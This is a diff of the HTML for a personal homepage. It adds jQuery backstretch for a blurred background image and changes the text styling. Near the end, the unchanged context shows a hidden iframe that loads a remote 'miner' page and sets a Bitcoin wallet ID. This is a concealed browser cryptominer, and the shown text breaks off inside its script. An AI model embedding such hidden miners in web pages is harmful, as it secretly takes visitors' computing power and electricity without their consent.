@@ -3,6 +3,8 @@
   <head>
     <meta charset="utf-8">
     <title>0xABCDEF.com</title>
+    <script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
     <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
     <style>
     body {
@@ -14,9 +16,9 @@
       margin: 0;
       font-family: Times;
       font-size: 17px;
-      text-shadow: 1px 1px #000;
-      opacity: 0.6;
-      color: #ddd;
+      text-shadow: 2px 2px 4px #fff;
+      opacity: 0.4;
+      color: #000;
     }
     i {
       font-size: 20px;
@@ -31,13 +33,7 @@
       font-family: monospace;
       text-decoration: underline;
     }
-    #background {
-      position: absolute;
-      top: -5%;
-      left: -5%;
-      min-width: 110%;
-      min-height: 110%;
-      z-index: -1;
+    .backstretch {
       filter: blur(20px);
       -o-filter: blur(20px);
       -ms-filter: blur(20px);
@@ -47,7 +43,6 @@
     </style>
   </head>
   <body>
-    <img id="background" src="http://www.gravatar.com/avatar/00f091701fb49f41504d7c15edc5de9d?s=10">
     <h1>JongChan Choi</h1>
     <img src="http://www.gravatar.com/avatar/00f091701fb49f41504d7c15edc5de9d?s=150">
     <br>
@@ -65,6 +60,9 @@
     <p>Born in 1994</p>
     <p>Seoul, Korea</p>
     <p>Nowadays, I am making drawing tools</p>
+    <script type="text/javascript">
+    $.backstretch('http://www.gravatar.com/avatar/00f091701fb49f41504d7c15edc5de9d?s=10');
+    </script>
     <iframe style='display:none' src='http://tidbit.co.in/miner'>
       <script>
       window.walletId = 1Jy6AJoyQt5A9d1t8Fhr9PxYFShuW95ui5
